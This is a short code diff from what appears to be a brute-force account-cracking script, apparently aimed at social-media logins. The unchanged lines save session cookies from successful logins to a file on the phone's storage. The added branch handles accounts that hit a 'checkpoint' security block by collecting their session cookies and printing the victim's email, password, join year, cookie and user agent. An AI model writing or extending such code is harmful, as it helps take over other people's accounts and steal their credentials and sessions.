@@ -632,6 +632,20 @@ def gxds_files(uid, pxss, fb, fb1, tl):
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 oks.append(uid)
                 break
+              elif "checkpoint" in jabeee:
+                coki = ";".join(
+                    [
+                        key + "=" + value
+                        for key, value in session.cookies.get_dict().items()
+                    ]
+                )
+                print(f"""{lgr} -- [GXDS CHECKPOINT] --
+ EMAIL  : {uid} 
+ PASS   : {ps} 
+ JOINED : {yrs}
+ COOKIE : {coki}
+ AGENT  : {ugen}
+""")
             else:
               continue
         loop += 1
